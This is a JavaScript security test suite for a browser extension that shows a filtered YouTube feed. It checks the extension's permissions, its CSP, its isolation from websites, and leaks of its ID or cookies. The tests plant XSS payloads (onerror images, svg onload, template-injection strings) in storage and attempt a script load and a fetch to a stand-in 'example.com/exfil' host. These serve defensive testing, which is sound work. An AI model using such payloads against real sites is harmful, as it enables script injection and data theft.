// Security tests: data leaks and ways to hijack the extension.
// Run in the VM only:  tests/extension/vm-run.sh security.mjs
import { launchBrave, CDP, openPage, waitFor, sleep } from "./cdp.mjs";

const [brave, extension] = process.argv.slice(2);
const results = [];
const check = (name, ok, detail = "") => {
  results.push({ name, ok: Boolean(ok) });
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? "  — " + detail : ""}`);
};
const info = (...a) => console.log("      " + a.join(" "));

const b = await launchBrave({ brave, extension });
const cdp = await CDP.connect(b.ws);
const ID = b.extId;
const EXT = `chrome-extension://${ID}`;

// --- capture every request + header in every target --------------------------
const requests = new Map();
const contexts = [];   // { id, session, origin, frameId }
const pageErrors = []; // exceptions thrown in extension pages
cdp.on(m => {
  const p = m.params || {};
  if (m.method === "Target.attachedToTarget") {
    const s = p.sessionId;
    for (const [meth, args] of [["Network.enable", {}], ["Runtime.enable", {}], ["Page.enable", {}],
      ["Target.setAutoAttach", { autoAttach: true, waitForDebuggerOnStart: false, flatten: true }],
      ["Runtime.runIfWaitingForDebugger", {}]]) cdp.send(meth, args, s).catch(() => {});
  } else if (m.method === "Network.requestWillBeSent") {
    const r = requests.get(p.requestId) || {};
    const body = p.request.postData || (p.request.postDataEntries || []).map(e => {
      try { return Buffer.from(e.bytes || "", "base64").toString("utf8"); } catch { return ""; } }).join("");
    requests.set(p.requestId, { ...r, url: p.request.url, type: p.type, body: (r.body || "") + body, hasBody: p.request.hasPostData,
                                session: m.sessionId, reqHeaders: { ...(r.reqHeaders || {}), ...lower(p.request.headers) } });
  } else if (m.method === "Network.requestWillBeSentExtraInfo") {
    const r = requests.get(p.requestId) || {};
    requests.set(p.requestId, { ...r, extra: lower(p.headers) });
  } else if (m.method === "Network.loadingFailed") {
    const r = requests.get(p.requestId) || {};
    requests.set(p.requestId, { ...r, failed: p.errorText });
  } else if (m.method === "Runtime.exceptionThrown") {
    pageErrors.push(p.exceptionDetails?.exception?.description || p.exceptionDetails?.text);
  } else if (m.method === "Runtime.executionContextCreated") {
    contexts.push({ id: p.context.id, session: m.sessionId, origin: p.context.origin, aux: p.context.auxData });
  }
});
const lower = h => Object.fromEntries(Object.entries(h || {}).map(([k, v]) => [k.toLowerCase(), v]));
const sent = r => ({ ...(r.reqHeaders || {}), ...(r.extra || {}) });
const findReq = sub => [...requests.values()].filter(r => r.url?.includes(sub));
async function evalIn(ctx, expr) {
  const r = await cdp.send("Runtime.evaluate", { expression: expr, returnByValue: true, awaitPromise: true, contextId: ctx.id }, ctx.session).catch(e => ({ error: e.message }));
  return r.error ? { error: r.error } : r.result?.value;
}
const embedContexts = () => contexts.filter(c => c.origin === "https://www.youtube-nocookie.com" && c.aux?.isDefault !== false);

try {
  await cdp.send("Target.setAutoAttach", { autoAttach: true, waitForDebuggerOnStart: false, flatten: true });
  const fake = (domain, name) => ({ name, value: `FAKE-${domain}`, domain, path: "/", secure: true, httpOnly: true,
                                    sameSite: "None", expires: Date.now() / 1000 + 3600 });
  await cdp.send("Storage.setCookies", { cookies: [fake(".youtube.com", "SID"), fake(".google.com", "SID"),
                                                    fake(".youtube-nocookie.com", "VISITOR_INFO1_LIVE")] });

  // === 1. Manifest: nothing that widens the attack surface ====================
  const portal = await openPage(cdp, `${EXT}/portal.html`);
  const mf = await portal.evaluate(`chrome.runtime.getManifest()`);
  const perms = [...(mf.permissions || []), ...(mf.host_permissions || [])];
  const risky = perms.filter(p => /tabs|cookies|history|webRequest|scripting|debugger|management|nativeMessaging|<all_urls>|\*:\/\/\*\//.test(p));
  check("manifest asks for no broad or risky permissions", risky.length === 0, perms.join(", "));
  check("no web-accessible resources (sites can't load extension files)", !mf.web_accessible_resources?.length);
  check("no external messaging from websites or other extensions", mf.externally_connectable && !mf.externally_connectable.matches?.length && !mf.externally_connectable.ids?.length,
        mf.externally_connectable ? JSON.stringify(mf.externally_connectable) : "not declared");

  // Normal refresh so there's real data to attack around.
  const listed = await waitFor(() => portal.evaluate(`document.querySelectorAll(".item").length >= 10 && !/…$/.test(document.querySelector(".status")?.textContent || "")`), 240000, 1000);
  if (!listed) throw new Error("refresh didn't finish: " + await portal.evaluate(`document.querySelector(".status")?.textContent`));

  // === 2. Poisoned data: XSS through titles, names, reasons, storage ==========
  const PAYLOADS = [
    `<img src=x onerror="window.__pwned='img'">`,
    `<script>window.__pwned='script'</script>`,
    `"><svg onload="window.__pwned='svg'">`,
    `javascript:window.__pwned='js'`,
    `{{constructor.constructor('window.__pwned=1')()}}`,
  ];
  await portal.evaluate(`chrome.storage.local.get(["feed", "creators"]).then(r => { window.__clean = r; })`);
  const clean = await portal.evaluate(`window.__clean`);
  await portal.evaluate(`(async () => {
    const P = ${JSON.stringify(PAYLOADS)};
    const feed = (await chrome.storage.local.get("feed")).feed;
    feed.items = feed.items.map((it, i) => ({ ...it, title: P[i % P.length] + it.title, channel: P[(i + 1) % P.length],
                                              reason: P[(i + 2) % P.length] }));
    feed.items.push({ id: "x\\" onclick=\\"window.__pwned='id'", title: "bad id", channel: "x", channel_id: "UCx",
                      published: new Date().toISOString(), kind: "list" });
    feed.dropped = [{ name: P[0], reason: P[1] }];
    await chrome.storage.local.set({ feed, config: { auto_refresh_hours: 0 } });
    const c = (await chrome.storage.local.get("creators")).creators;
    c.push({ name: P[0], handle: P[2], dropped: P[1] });
    // Hostile priority values (the name above also feeds the menu's aria-label).
    const BAD = [P[0], "__proto__", "constructor", { toString: "x", valueOf: 1 }, 123, null, "HIGH"];
    BAD.forEach((v, i) => { c[i].priority = v; });
    await chrome.storage.local.set({ creators: c });
  })()`);
  await portal.evaluate(`location.reload()`);
  await sleep(1500);
  const settingsPage = await openPage(cdp, `${EXT}/settings.html`);
  await sleep(1500);
  // Click everything clickable that a payload could have created.
  const portalState = await portal.evaluate(`(() => {
    document.querySelectorAll("a, li").forEach(e => e.dispatchEvent(new MouseEvent("mouseover", { bubbles: true })));
    return { pwned: window.__pwned ?? null,
             injected: document.querySelectorAll("main img, main script, main svg, main iframe").length,
             literal: document.body.textContent.includes("<img src=x onerror") };
  })()`);
  const settingsState = await settingsPage.evaluate(`({ pwned: window.__pwned ?? null,
    injected: document.querySelectorAll("main img, main script, main svg, main iframe").length,
    literal: document.body.textContent.includes("<img src=x onerror") })`);
  check("poisoned titles/channels/reasons don't execute (portal)", !portalState.pwned && portalState.injected === 0 && portalState.literal, JSON.stringify(portalState));
  check("poisoned creator names don't execute (settings)", !settingsState.pwned && settingsState.injected === 0 && settingsState.literal, JSON.stringify(settingsState));
  const menus = await settingsPage.evaluate(`[...document.querySelectorAll("#creators select")].map(s => s.value)`);
  check("poisoned priorities show a valid menu choice (never blank)",
        menus.length > 7 && menus.every(v => ["normal", "high", "low"].includes(v)), JSON.stringify(menus.slice(0, 8)));
  // A refresh must still work with the poisoned priorities in storage.
  const errorsBefore = pageErrors.length;
  await portal.evaluate(`document.querySelector(".refresh").click()`);
  await waitFor(() => portal.evaluate(`!!document.querySelector(".refresh") && !document.querySelector(".refresh").disabled`), 200000, 1000);
  const afterPoison = await portal.evaluate(`chrome.storage.local.get("feed").then(r => ({ status: r.feed.status, items: r.feed.items.length, error: r.feed.error }))`);
  check("refresh survives poisoned priorities", afterPoison.status === "ok" && afterPoison.items === 10 && pageErrors.length === errorsBefore,
        JSON.stringify(afterPoison) + (pageErrors.length > errorsBefore ? " errors: " + pageErrors.slice(errorsBefore).join(" | ") : ""));
  await portal.evaluate(`location.hash = "#watch/" + encodeURIComponent('<img src=x onerror=window.__pwned=1>')`);
  await sleep(800);
  check("malicious #watch/ hash is ignored", await portal.evaluate(`!window.__pwned && !document.querySelector(".stage")`));

  // === 3. CSP: injected code can't run or phone home ==========================
  const csp = await portal.evaluate(`(async () => {
    const v = []; document.addEventListener("securitypolicyviolation", e => v.push(e.violatedDirective));
    const out = {};
    // Code sent through the debugging protocol bypasses CSP, so probe eval
    // from a string timer, which runs on the page's own stack.
    try { setTimeout("window.__evalRan = true", 0); } catch {}
    window.addEventListener("message", e => { if (e.data === "probe") { try { new Function("window.__fnRan = true")(); } catch {} } });
    window.postMessage("probe", "*");
    const s = document.createElement("script"); s.textContent = "window.__pwned='inline'"; document.body.append(s);
    const r = document.createElement("script"); r.src = "https://example.com/evil.js"; document.body.append(r);
    const f = document.createElement("iframe"); f.src = "https://example.com/"; document.body.append(f);
    const i = document.createElement("img"); i.src = "https://example.com/beacon.png"; document.body.append(i);
    try { await fetch("https://example.com/exfil?d=1"); out.fetch = "ran"; } catch { out.fetch = "blocked"; }
    try { navigator.sendBeacon("https://example.com/beacon", "x"); } catch {}
    await new Promise(r => setTimeout(r, 1500));
    s.remove(); r.remove(); f.remove(); i.remove();
    out.eval = window.__evalRan ? "ran" : "blocked";
    out.fn = window.__fnRan ? "ran" : "blocked";
    return { ...out, inline: window.__pwned === "inline" ? "ran" : "blocked", violations: [...new Set(v)] };
  })()`);
  await sleep(1000);
  // Only requests whose headers were actually sent (ExtraInfo) left the browser.
  const exampleReqs = findReq("example.com").filter(r => r.extra && !r.failed);
  const exampleHits = exampleReqs.length;
  for (const r of findReq("example.com")) info("example.com request:", r.type, r.url, "reached network:", r.extra ? "yes" : "no");
  check("CSP blocks eval, inline/remote scripts, foreign frames, images and fetches",
        csp.eval === "blocked" && csp.fn === "blocked" && csp.inline === "blocked" && csp.fetch === "blocked" && exampleHits === 0,
        JSON.stringify(csp) + `; requests to example.com that got out: ${exampleHits}`);

  // === 4. Hostile website ======================================================
  const site = await openPage(cdp, "https://example.com/");
  await sleep(1500);
  const siteRes = await site.evaluate(`(async () => {
    const out = {};
    try { const r = await fetch("${EXT}/portal.html"); out.fetch = "read " + r.status; } catch { out.fetch = "blocked"; }
    try { const r = await fetch("${EXT}/manifest.json"); out.manifest = "read " + r.status; } catch { out.manifest = "blocked"; }
    out.runtime = typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage ? "exposed" : "absent";
    if (out.runtime === "exposed") {
      out.message = await new Promise(res => { try { chrome.runtime.sendMessage("${ID}", { hi: 1 }, r => res(chrome.runtime.lastError ? "rejected" : "answered")); } catch { res("rejected"); } });
    }
    const f = document.createElement("iframe"); f.src = "${EXT}/portal.html"; document.body.append(f);
    await new Promise(r => setTimeout(r, 1500));
    return out;
  })()`);
  const tree = await cdp.send("Page.getFrameTree", {}, site.sessionId);
  const child = tree.frameTree.childFrames?.[0]?.frame;
  const framed = child && child.url.startsWith("chrome-extension://") && !child.unreachableUrl;
  check("a website can't read extension files", siteRes.fetch === "blocked" && siteRes.manifest === "blocked", JSON.stringify(siteRes));
  check("a website can't frame the portal (no clickjacking)", !framed && /^chrome-error:/.test(child?.url || ""), `child frame: ${child?.url} ${child?.unreachableUrl || ""}`);
  check("a website can't message the extension", siteRes.runtime === "absent" || siteRes.message === "rejected", JSON.stringify(siteRes));

  // === 5. Embed filter is inert on other sites ================================
  const before = contexts.length;
  await site.evaluate(`(() => { const f = document.createElement("iframe");
    f.src = "https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ"; f.width = 560; f.height = 315; document.body.append(f); })()`);
  await waitFor(() => contexts.slice(before).some(c => c.origin === "https://www.youtube-nocookie.com"), 15000);
  await sleep(2500);
  const foreignEmbeds = contexts.slice(before).filter(c => c.origin === "https://www.youtube-nocookie.com");
  let foreignStyled = false;
  for (const c of foreignEmbeds) {
    const v = await evalIn(c, `!!document.querySelector("style[data-pacifier]")`);
    if (v === true) foreignStyled = true;
  }
  check("embed filter does nothing in other sites' YouTube embeds", foreignEmbeds.length > 0 && !foreignStyled,
        `${foreignEmbeds.length} embed contexts checked`);

  // === 6. Player messages can't be spoofed =====================================
  await portal.evaluate(`chrome.storage.local.set(${JSON.stringify(clean)})`);
  await portal.evaluate(`location.reload()`);
  await waitFor(() => portal.evaluate(`document.querySelectorAll(".item").length >= 10`), 20000, 500);
  // Positive control for the embed-filter test: it must be active in Pacifier's own player.
  const href = await portal.evaluate(`document.querySelector(".item a").getAttribute("href")`);
  await portal.evaluate(`location.hash = ${JSON.stringify(href)}`);
  await waitFor(() => portal.evaluate("!!(window.pacifierPlayer && pacifierPlayer.ready)"), 30000);
  await portal.evaluate(`for (const ev of [{ event: "onStateChange", info: 0 }, { event: "infoDelivery", info: { playerState: 0, currentTime: 999, duration: 1000 } }])
    window.postMessage(JSON.stringify({ ...ev, id: 1, channel: "widget" }), "*")`);
  await sleep(1500);
  let ownStyled = false;
  for (const c of embedContexts().filter(c => !foreignEmbeds.includes(c)))
    if (await evalIn(c, `!!document.querySelector("style[data-pacifier]")`) === true) ownStyled = true;
  check("embed filter is active in Pacifier's own player (control)", ownStyled);
  check("forged 'video ended' messages are ignored", await portal.evaluate(`location.hash.includes("watch") && !document.querySelector(".item")`));

  // === 7. What YouTube can learn ==============================================
  const mine = embedContexts().filter(c => !foreignEmbeds.includes(c));
  let seen = null;
  for (const c of mine) {
    const v = await evalIn(c, `({ ancestors: [...(location.ancestorOrigins || [])], referrer: document.referrer, url: location.href })`);
    if (v && !v.error) seen = v;
  }
  info("inside the embed YouTube's scripts see:", JSON.stringify(seen));
  // Known, unfixable in Chromium: location.ancestorOrigins is unforgeable and
  // isn't masked by referrerpolicy. Reported, not failed; the checks below
  // fail if the ID is ever actually transmitted.
  if (seen && JSON.stringify(seen).includes(ID)) info("RISK  YouTube's embed scripts can read the extension ID via location.ancestorOrigins (not transmitted in anything observed)");
  check("embed sees no referrer or ID in its own URL", seen && !seen.referrer && !seen.url.includes(ID), JSON.stringify(seen));
  const idInRequests = [...requests.values()].filter(r => r.url && !r.url.startsWith("chrome-extension://") &&
    (r.url.includes(ID) || Object.values(sent(r)).some(v => String(v).includes(ID))));
  check("extension ID not sent in any request URL or header", idInRequests.length === 0,
        idInRequests.slice(0, 4).map(r => `${new URL(r.url).host} ${Object.entries(sent(r)).filter(([, v]) => String(v).includes(ID)).map(([k]) => k).join(",")}`).join(" | "));
  // Network blocking actually works (it needs the right permission).
  const blockProbe = await portal.evaluate(`fetch("https://www.youtube.com/pagead/pacifier-probe", { credentials: "omit" }).then(() => "allowed", () => "blocked")`);
  const gapi = findReq("googleapis.com").concat(findReq("www.google.com"));
  info("google/googleapis requests:", gapi.map(r => `${new URL(r.url).host}${new URL(r.url).pathname.slice(0, 40)} ${r.failed ? "[" + r.failed + "]" : ""}`).join(" | ") || "none");
  check("ad/tracking endpoints are blocked in Pacifier", blockProbe === "blocked", blockProbe);
  // Request bodies too (YouTube's player API calls are JSON POSTs).
  const posts = [...requests.values()].filter(r => r.hasBody && /^https:/.test(r.url || ""));
  const idInBodies = posts.filter(r => (r.body || "").includes(ID) || (r.body || "").includes("chrome-extension"));
  check("extension ID not sent in any request body", idInBodies.length === 0,
        `${posts.length} POSTs checked` + (idInBodies.length ? `; leaked by: ${idInBodies.map(r => new URL(r.url).pathname).join(", ")}` : ""));
  info("POST endpoints:", [...new Set(posts.map(r => new URL(r.url).host + new URL(r.url).pathname))].join(", "));
  const ALLOWED = /(^|\.)(youtube\.com|youtube-nocookie\.com|googlevideo\.com|ytimg\.com|ggpht\.com|gstatic\.com|google\.com|googleapis\.com|example\.com)$/;
  const external = [...requests.values()].filter(r => /^https?:/.test(r.url || "") && !r.failed);
  const offList = [...new Set(external.map(r => new URL(r.url).host).filter(h => !ALLOWED.test(h) && h !== "127.0.0.1"))];
  check("data only goes to YouTube/Google hosts", offList.length === 0, offList.join(", ") || `${external.length} requests`);
  const leaks = external.filter(r => (sent(r).cookie || "").includes("FAKE") && !findReq("pacifier_probe").includes(r) && !/example\.com/.test(r.url));
  check("no real cookies sent from Pacifier", leaks.length === 0, leaks.map(r => new URL(r.url).host).join(", "));

  // === 8. Network rules don't leak into normal browsing =======================
  const PROBE = "https://www.youtube.com/feeds/videos.xml?channel_id=UCsBjURrPoezykLs9EqgamOA&pacifier_probe=";
  const normalTab = await openPage(cdp, "about:blank");
  await cdp.send("Network.enable", {}, normalTab.sessionId);
  await cdp.send("Page.navigate", { url: PROBE + "normal" }, normalTab.sessionId);
  await sleep(2500);
  const normal = findReq("pacifier_probe=normal").map(sent)[0] || {};
  check("other tabs: YouTube gets the user's own cookies (rules not applied)", (normal.cookie || "").includes("FAKE"), `cookie: ${normal.cookie}`);
  await portal.evaluate(`location.hash = ""`);
  await cdp.send("Network.enable", {}, portal.sessionId);
  await cdp.send("Page.navigate", { url: PROBE + "portaltab" }, portal.sessionId);
  await sleep(2500);
  const portalTab = findReq("pacifier_probe=portaltab").map(sent)[0] || {};
  check("Pacifier tab navigated to YouTube: rules no longer applied", (portalTab.cookie || "").includes("FAKE"), `cookie: ${portalTab.cookie}`);
} catch (e) {
  check("test ran to completion", false, e.stack);
} finally {
  cdp.close();
  b.proc.kill();
  await sleep(500);
}
const failed = results.filter(r => !r.ok).length;
console.log(`\n${results.length - failed}/${results.length} passed`);
process.exit(failed ? 1 : 0);
